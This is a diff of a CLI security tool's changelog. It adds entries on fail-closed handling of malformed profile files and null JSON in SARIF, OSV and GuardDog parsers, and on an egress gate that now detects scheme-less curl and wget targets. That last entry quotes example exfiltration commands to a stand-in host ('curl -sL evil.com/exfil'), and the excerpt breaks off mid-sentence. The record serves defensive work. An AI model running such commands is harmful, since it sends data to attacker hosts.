@@ -36,6 +36,19 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/).
 
 ### Security
 
+- **Malformed input now yields a verdict, never an uncaught crash (fail-closed parsers).** The
+  bug sweep found the historical "malformed file → uncaught throw → empty stdout" class had
+  reappeared in several spots, all now fixed:
+  - a malformed/schema-invalid `.kit-profile.toml` crashed every `kit profile` subcommand
+    (`show`/`check`/`sign`/`verify`/`freeze`) with an uncaught `InvalidProfileError` and empty
+    `--json` stdout — a denial-of-verdict for CI. The top-level handler now catches
+    `KIT_INVALID_PROFILE` exactly like `KIT_INVALID_CONFIG`: a clean `{ok:false,error}` JSON +
+    exit 1.
+  - `classifyGuardDog` and the SARIF/OSV ingesters (`parseSarif`/`parseOsv`) dereferenced a
+    `JSON.parse` result without a non-object guard, so a literal `null` (valid JSON) threw a
+    `TypeError` — for GuardDog, crashing the whole `kit check --category security` run. They now
+    treat a null/non-object result as "unverified"/`[]` per their documented fail-closed contract.
+
 - **egress-gate now enforces scheme-less `curl`/`wget` targets.** Network-target extraction
   parsed only explicit `http(s)://` URLs, so `curl evil.com`, `wget evil.com/x`, and
   `curl -sL evil.com/exfil` — the most common egress forms — produced zero hosts and the signed
